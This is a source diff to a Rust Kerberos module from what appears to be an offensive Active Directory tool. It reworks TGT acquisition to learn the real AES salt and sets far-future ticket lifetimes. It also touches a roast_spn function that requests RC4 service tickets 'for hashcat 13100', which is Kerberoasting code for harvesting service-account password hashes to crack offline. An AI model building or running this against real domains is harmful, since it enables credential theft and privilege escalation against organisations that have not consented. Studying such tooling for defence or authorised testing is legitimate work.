@@ -27,10 +27,11 @@ use picky_krb::constants::types::{
 };
 use picky_krb::crypto::{Cipher, CipherSuite};
 use picky_krb::data_types::{
-    Authenticator, AuthenticatorInner, EncryptedData, PaData, PaEncTsEnc, PrincipalName, Ticket,
+    Authenticator, AuthenticatorInner, EncryptedData, EtypeInfo2, PaData, PaEncTsEnc, PrincipalName,
+    Ticket,
 };
 use picky_krb::messages::{
-    ApReq, ApReqInner, AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, TgsRep, TgsReq,
+    ApReq, ApReqInner, AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, KrbError, TgsRep, TgsReq,
 };
 
 /// Ticket-Granting Ticket plus the material needed to use it.
@@ -65,17 +66,89 @@ fn nonce() -> IntegerAsn1 {
     IntegerAsn1(n.to_vec())
 }
 
-/// AS-REQ with PA-ENC-TIMESTAMP, then recover the TGT + session key from the AS-REP.
+/// Build an AS-REQ for `user@realm` requesting AES256, optionally carrying pre-auth.
+fn build_as_req(realm: &str, user: &str, padata: Option<PaData>) -> AsReq {
+    let body = KdcReqBody {
+        kdc_options: ExplicitContextTag0::from(kdc_options()),
+        cname: Optional::from(Some(ExplicitContextTag1::from(principal(NT_PRINCIPAL, &[user])))),
+        realm: ExplicitContextTag2::from(krb_string(realm)),
+        sname: Optional::from(Some(ExplicitContextTag3::from(principal(NT_SRV_INST, &["krbtgt", realm])))),
+        from: Optional::from(None),
+        till: ExplicitContextTag5::from(crate::far_future_time()),
+        rtime: Optional::from(None),
+        nonce: ExplicitContextTag7::from(nonce()),
+        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![crate::ETYPE_AES256])])),
+        addresses: Optional::from(None),
+        enc_authorization_data: Optional::from(None),
+        additional_tickets: Optional::from(None),
+    };
+    let pa = padata.map(|p| ExplicitContextTag3::from(Asn1SequenceOf::from(vec![p])));
+    AsReq::from(KdcReq {
+        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
+        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
+        padata: Optional::from(pa),
+        req_body: ExplicitContextTag4::from(body),
+    })
+}
+
+/// Pull the AES salt from a KRB-ERROR's ETYPE-INFO2 pre-auth hint; fall back to `default`.
+fn extract_salt(err: &KrbError, default: &str) -> String {
+    let Some(edata) = err.0.e_data.0.as_ref() else { return default.to_string() };
+    let Ok(padatas) =
+        picky_asn1_der::from_bytes::<picky_asn1::wrapper::Asn1SequenceOf<PaData>>(&edata.0 .0)
+    else {
+        return default.to_string();
+    };
+    for pa in padatas.0 {
+        if pa.padata_type.0 .0 == vec![0x13] {
+            // PA-ETYPE-INFO2
+            if let Ok(info) = picky_asn1_der::from_bytes::<EtypeInfo2>(&pa.padata_data.0 .0) {
+                for entry in info.0 {
+                    if let Some(salt) = entry.salt.0.as_ref() {
+                        return String::from_utf8_lossy(salt.0.as_bytes()).into_owned();
+                    }
+                }
+            }
+        }
+    }
+    default.to_string()
+}
+
+/// AS-REP roast a TGT via the two-step AS exchange: first an un-authenticated AS-REQ to
+/// learn the real salt (ETYPE-INFO2), then an AS-REQ with PA-ENC-TIMESTAMP.
 pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Result<Tgt> {
     let realm = realm.to_uppercase();
     let cipher = aes256();
-    // AD AES salt = UPPERCASE(realm) + sAMAccountName.
-    let salt = format!("{realm}{user}");
+    // The Kerberos client principal is the bare sAMAccountName — strip any UPN suffix
+    // (user@realm) or NetBIOS prefix (DOMAIN\user) that came from the LDAP bind identity.
+    let user = user.split('@').next().unwrap_or(user);
+    let user = user.rsplit('\\').next().unwrap_or(user);
+    let default_salt = format!("{realm}{user}");
+
+    // Step 1 — no pre-auth: expect KRB-ERROR(25 = PREAUTH_REQUIRED) carrying ETYPE-INFO2.
+    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None))
+        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
+    let resp1 = kdc_exchange(kdc, &raw1).await?;
+    let salt = if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
+        default_salt.clone() // pre-auth not required (rare)
+    } else {
+        match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
+            Ok(err) => {
+                let code = err.0.error_code.0;
+                if code != 25 {
+                    bail!("KDC error {code} on initial AS-REQ");
+                }
+                extract_salt(&err, &default_salt)
+            }
+            Err(e) => bail!("unexpected AS response: {e}"),
+        }
+    };
+
     let key = cipher
         .generate_key_from_password(password.as_bytes(), salt.as_bytes())
         .map_err(|e| anyhow!("derive AES key: {e}"))?;
 
-    // PA-ENC-TIMESTAMP: encrypted current time proving password knowledge.
+    // Step 2 — AS-REQ with PA-ENC-TIMESTAMP encrypted under the derived key.
     let ts = PaEncTsEnc {
         patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
         pausec: Optional::from(None),
@@ -84,44 +157,27 @@ pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Resu
     let enc_ts = cipher
         .encrypt(&key, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der)
         .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
-    let pa_ts_der = picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts))
-        .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?;
     let padata = PaData {
-        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])), // PA-ENC-TIMESTAMP
-        padata_data: ExplicitContextTag2::from(OctetStringAsn1(pa_ts_der)),
+        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
+        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
+            picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts))
+                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
+        )),
     };
+    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata)))
+        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
+    let resp2 = kdc_exchange(kdc, &raw2).await?;
+    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp2).map_err(|e| {
+        match picky_asn1_der::from_bytes::<KrbError>(&resp2) {
+            Ok(err) => anyhow!("pre-auth AS-REQ rejected, KDC error {}", err.0.error_code.0),
+            Err(_) => anyhow!("AS-REP decode: {e}"),
+        }
+    })?;
 
-    let body = KdcReqBody {
-        kdc_options: ExplicitContextTag0::from(kdc_options()),
-        cname: Optional::from(Some(ExplicitContextTag1::from(principal(NT_PRINCIPAL, &[user])))),
-        realm: ExplicitContextTag2::from(krb_string(&realm)),
-        sname: Optional::from(Some(ExplicitContextTag3::from(principal(NT_SRV_INST, &["krbtgt", &realm])))),
-        from: Optional::from(None),
-        till: ExplicitContextTag5::from(now_kerberos_time()),
-        rtime: Optional::from(None),
-        nonce: ExplicitContextTag7::from(nonce()),
-        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![crate::ETYPE_AES256])])),
-        addresses: Optional::from(None),
-        enc_authorization_data: Optional::from(None),
-        additional_tickets: Optional::from(None),
-    };
-    let as_req = AsReq::from(KdcReq {
-        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
-        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
-        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(vec![padata])))),
-        req_body: ExplicitContextTag4::from(body),
-    });
-
-    let raw = picky_asn1_der::to_vec(&as_req).map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
-    let resp = kdc_exchange(kdc, &raw).await?;
-    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp)
-        .map_err(|e| anyhow!("AS-REP decode (wrong password / pre-auth failure?): {e}"))?;
-
-    // Decrypt the AS-REP enc-part (client key, usage 3) to get the session key.
     let enc = &as_rep.0.enc_part.0;
     let plain = cipher
         .decrypt(&key, AS_REP_ENC, &enc.cipher.0 .0)
-        .map_err(|e| anyhow!("decrypt AS-REP (bad password?): {e}"))?;
+        .map_err(|e| anyhow!("decrypt AS-REP: {e}"))?;
     let enc_part: EncAsRepPart =
         picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
     let session_key = enc_part.0.key.0.key_value.0 .0.clone();
@@ -179,7 +235,7 @@ pub async fn roast_spn(tgt: &Tgt, sam: &str, spn: &str, kdc: &str) -> Result<Str
         realm: ExplicitContextTag2::from(krb_string(&tgt.crealm)),
         sname: Optional::from(Some(ExplicitContextTag3::from(sname))),
         from: Optional::from(None),
-        till: ExplicitContextTag5::from(now_kerberos_time()),
+        till: ExplicitContextTag5::from(crate::far_future_time()),
         rtime: Optional::from(None),
         nonce: ExplicitContextTag7::from(nonce()),
         // Prefer an RC4 service ticket ⇒ hashcat 13100.
